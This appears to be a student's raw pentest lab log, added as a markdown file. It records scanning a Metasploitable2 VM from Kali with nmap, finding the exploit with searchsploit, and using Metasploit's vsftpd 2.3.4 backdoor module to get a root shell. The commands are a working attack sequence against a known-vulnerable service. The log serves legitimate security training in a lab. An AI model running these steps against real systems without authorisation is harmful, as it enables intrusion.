@@ -1,0 +1,79 @@
+# Raw AAR
+
+Pentest Lab  Live Action Report 1
+
+MAY 22 2025
+
+# is the start of live code copied from kali 
+- notes or comments
+
+START
+
+- logged into kali and tried the following
+- sudo su -> root access.
+whoami
+pwd
+ls -l
+- nmap will be what I first use to exploit.
+- nmap -h and skim read all the tools and options
+- got into metasploitable2
+- logged into msfadmin
+ip -a 
+- nothing wrong command
+ipconfig
+- nothing wrong command
+ip a
+- success we have the details needed
+- grabbed ip from MSP2
+- back to kali
+nmap -O -Sv <msp2 ip>
+- error wrong syntax
+nmap -O -sV <msp2 ip>
+-successful scan
+ping -c  4 <msp2 ip>
+- successful ping
+notice vsftpd open port
+- i know a command from a tutorial i watched
+searchsploit vsftpd
+- good search
+- target acquired
+vsftpd 2.3.4 backdoor command execution.
+- We have our target .
+msfconsole
+search vsftpd
+- matching modules found.
+- find exploit with excellent rank for backdoor module
+use 1
+set ROHTS <msp2 ip>
+error did you mean RHOST?
+set RHOST <msp2 ip>
+run
+- exploit completed but no session was created.
+set RHOST and run again
+# port used by backdoor is already open
+-found shell
+# command shell session 1 opened
+- target breached.
+whoami
+root(msp2)
+ip a
+ip details
+ls -l
+- full access to msp2 terminal.
+- success.
+background
+Y
+sessions
+sessions -k 1
+- session 1 killed.
+exit
+clear
+su - <user>
+whoami
+clear
+exit (root)
+exit (user)
+exit (shell)
+shutdown metasploitable2 
+shutdown kali 
+
